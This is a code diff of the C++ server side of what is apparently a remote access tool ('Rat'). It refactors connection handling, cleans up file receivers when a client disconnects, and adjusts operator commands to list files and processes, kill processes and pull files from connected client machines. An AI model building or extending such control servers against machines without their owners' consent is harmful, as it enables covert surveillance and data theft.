@@ -11,33 +11,6 @@
 namespace Rat 
 {
 
-    std::string md5HashString(const std::string& input) 
-    {
-        unsigned char md_value[EVP_MAX_MD_SIZE];
-        unsigned int md_len = 0;
-        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
-        EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);
-        EVP_DigestUpdate(mdctx, input.data(), input.size());
-        EVP_DigestFinal_ex(mdctx, md_value, &md_len);
-        EVP_MD_CTX_free(mdctx);
-        std::stringstream ss;
-        for (unsigned int i = 0; i < md_len; ++i)
-            ss << std::hex << std::setw(2) << std::setfill('0') << (int)md_value[i];
-        return ss.str();
-    }
-
-    std::string generateRandomData(size_t length) 
-    {
-        std::random_device rd;
-        std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(33, 126);
-        std::string data;
-        for (size_t i = 0; i < length; ++i) {
-            data += static_cast<char>(dis(gen));
-        }
-        return data;
-    }
-
     Server::Server(uint16_t port)
         : networkManager_(), acceptor_(networkManager_.get_io_context(), boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
         
@@ -102,21 +75,29 @@ namespace Rat
             networkManager_.get_io_context(), networkManager_.get_ssl_context());
 
         acceptor_.async_accept(socket->lowest_layer(),
-            [this, socket](const boost::system::error_code& ec) {
-                if (!ec) {
+            [this, socket](const boost::system::error_code& ec) 
+            {
+                if (!ec) 
+                {
                     // socket->set_verify_mode(boost::asio::ssl::verify_peer);
                     socket->async_handshake(boost::asio::ssl::stream_base::server,
-                        [this, socket](const boost::system::error_code& ec) {
-                            if (!ec) {
+                        [this, socket](const boost::system::error_code& ec) 
+                        {
+                            if (!ec) 
+                            {
                                 std::cout << "New client connected: " << socket->lowest_layer().remote_endpoint().address().to_string() << "\n";
                                 handleClient(socket);
-                            } else {
+                            } 
+                            else 
+                            {
                                 std::cout << "Handshake error: " << ec.message() << "\n";
                             }
                             boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                             // acceptConnections();
                         });
-                } else {
+                } 
+                else 
+                {
                     std::cout << "Accept error: " << ec.message() << "\n";
                     boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                     // acceptConnections();
@@ -125,16 +106,35 @@ namespace Rat
     }
 
     
-    void Server::handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) {
+    void Server::handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) 
+    {
         networkManager_.receive(client,
             [this, client](const rat::Packet& packet, const boost::system::error_code& ec) 
             {
 
                 if (ec) 
                 {
+                    // std::cout << "reset GUI: " << std::endl;
+                    ServerGUI::resetHeaderDisplayed();
                     std::cout << "Client error: " << ec.message() << "\n";
                     client->lowest_layer().close();
                     removeClient(client);
+                    uint64_t client_id = -1;
+                    {
+                        auto client_id_it = clients_.find(client);
+                        if(client_id_it != clients_.end())
+                        {
+                            client_id = client_id_it->second;
+                        }
+                    }
+                    
+                    {
+                        std::lock_guard<std::mutex> lock(file_receivers_mutex_);
+                        file_receivers_.erase(client_id); 
+                        
+                    }
+                    std::cout << "reset GUI: " << std::endl;
+                    ServerGUI::resetHeaderDisplayed();
                     return;
                 }
                 if (packet.has_chunked_data()) 
@@ -172,7 +172,8 @@ namespace Rat
                             {
                                 std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                 auto client_it = clients_.find(client);
-                                if (client_it == clients_.end()) {
+                                if (client_it == clients_.end()) 
+                                {
                                     std::cerr << "[" << std::time(nullptr) << "] Unknown client sending TRANSFER_FILE\n";
                                     break;
                                 }
@@ -180,13 +181,14 @@ namespace Rat
                                 ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                             }
                             auto receiver_it = file_receivers_.find(client_id);
-                            if (receiver_it == file_receivers_.end()) {
-                                // std::string file_path = "received_" + Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + ".txt";
+                            if (receiver_it == file_receivers_.end()) 
+                            {
                                 std::string file_path = Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + Utils::getFileName(packet.file_path());
                                 std::string filename = Utils::getFileName(packet.file_path());
                                 auto receiver = std::make_shared<FileReceiver>(
                                     client, networkManager_, file_path, packet.chunked_data().data_id(), client_id,
-                                    [this, client_id, client]() {
+                                    [this, client_id, client]() 
+                                    {
                                         // std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                         
                                         // auto it = file_receivers_.find(client_id);
@@ -205,14 +207,18 @@ namespace Rat
                                 
                                         handleClient(client);
                                     }, 
-                                    [this, client_id, ip_id, filename](uint64_t sequence_number, uint64_t total_chunks) {
+                                    [this, client_id, ip_id, filename](uint64_t sequence_number, uint64_t total_chunks) 
+                                    {
                                         ServerGUI::displayProgress(client_id, ip_id, filename, sequence_number, total_chunks);
                                     });
 
                                 
                                 file_receivers_[client_id] = receiver;
                                 receiver->startReceiving(packet);
-                            } else {
+                            } 
+                            else 
+                            {
+                                // std::cout << "debug find id " << std::endl;
                                 receiver_it->second->startReceiving(packet);
                             }
 
@@ -250,10 +256,10 @@ namespace Rat
     void Server::handleUserInput() 
     {
         std::string input;
-        std::cout << "Enter packet type (LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
+        // std::cout << "Enter packet type (LIST_FILES_FOLDERS, LIST_PROCESSES, KILL_PROCESS): ";
         while (std::getline(std::cin, input)) 
         {
-
+            std::cout << "COMMAND: " << std::endl;
             std::vector<std::string> list_commands = Utils::handleCommand(input);
             // std::cout << "Debug size: " << list_commands.size() << std::endl;
             // for(auto x: list_commands) {std::cout << x << std::endl;}
@@ -262,6 +268,7 @@ namespace Rat
                 std::string command = list_commands[0];
                 std::string object = list_commands[1];
                 std::string argument = list_commands[2];
+                // transfer_file 127.0.0.1/0 /home/quang/Downloads/ubuntu.txt
                 // argument = "/home/quang/Downloads/ubuntu.iso";
                 uint64_t object_id = parseStaticIdPayload(object);
                 std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
@@ -311,7 +318,12 @@ namespace Rat
                     chunked->set_success(true);
                     for (auto& client : clients_) 
                     {
-                        sendCommandToClient(client.first, packet);
+                        if (client.first && client.first->lowest_layer().is_open()) {
+                            sendCommandToClient(client.first, packet);
+                        } else {
+                            std::cout << "[" << std::time(nullptr) << "] Skipping closed socket for client with id: " << client.second << "\n";
+                        }
+                        // sendCommandToClient(client.first, packet);
                     }
                 }
             }
@@ -385,50 +397,10 @@ namespace Rat
                     });
                 }
             }
-            continue;
-            /// 
-            // if (input == "list_clients") 
-            // {
-            //     ServerGUI::displayClients(clients_);
-            //     continue;
-            // }
-            // rat::Packet packet;
-            // packet.set_packet_id("server_" + std::to_string(std::rand()));
-            // packet.set_source_id("server");
-            // packet.set_destination_id("all_clients");
-
-            // if (input == "list_files") 
-            // {
-            //     packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
-            // } 
-            // else if (input == "list_processes") 
-            // {
-            //     packet.set_type(rat::Packet::LIST_PROCESSES);
-            // } 
-            // else if (input == "read_file") 
-            // {
-            //     packet.set_type(rat::Packet::READ_FILE);
-            // } 
-            // else if (input == "kill_process") 
-            // {
-            //     packet.set_type(rat::Packet::KILL_PROCESS);
-            // } 
-            // else 
-            // {
-            //     std::cout << "Unknown type, use: LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS\n";
-            //     std::cout << "Enter packet type: ";
-            //     continue;
-            // }
-
-            // auto* chunked = packet.mutable_chunked_data();
-            // chunked->set_payload(input);
-
-            // for (auto& client : clients_) 
-            // {
-            //     sendCommandToClient(client.first, packet);
-            // }
-            // std::cout << "Server sent: Type=" << input << ", Data=" << chunked->payload() << "\n";
-            // std::cout << "Enter packet type: ";
+            else 
+            {
+                std::cout << "Enter type again\n";
+            }
         }
     }
 
